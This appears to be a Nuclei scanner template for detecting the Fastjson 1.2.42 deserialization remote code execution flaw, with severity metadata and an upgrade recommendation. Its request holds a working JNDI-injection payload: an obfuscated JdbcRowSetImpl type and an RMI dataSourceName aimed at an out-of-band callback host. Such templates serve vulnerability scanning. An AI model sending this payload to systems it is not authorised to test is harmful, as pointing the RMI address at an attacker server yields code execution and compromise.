id: fastjson-1-2-42-rce
info:
  name: Fastjson 1.2.42 - Remote Code Execution
  author: zh
  severity: critical
  description: Fastjson 1.2.42 is vulnerable to a remote code execution exploit through
    deserialization.
  reference:
  - https://github.com/tdtc7/qps/tree/4042cf76a969ccded5b30f0669f67c9e58d1cfd2/Fastjson
  - https://github.com/wyzxxz/fastjson_rce_tool
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: fastjson,rce,deserialization,oast
  metadata:
    impact: The vulnerability in Fastjson 1.2.42 resulted in remote code execution,
      enabling attackers to execute arbitrary code on vulnerable systems.
    recommendation: It is recommended to update to a newer version of Fastjson to
      mitigate the risk of remote code execution.
requests:
- raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/json\n\n{\n  \
    \ \"@type\":\"LL\\u0063\\u006f\\u006d.sun.rowset.JdbcRowSetImpl;;\",\n   \"dataSourceName\"\
    :\"rmi://{{interactsh-url}}/Exploit\",\n   \"autoCommit\":true\n}\n"
  matchers-condition: and
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: status
    negative: true
    status:
    - 200
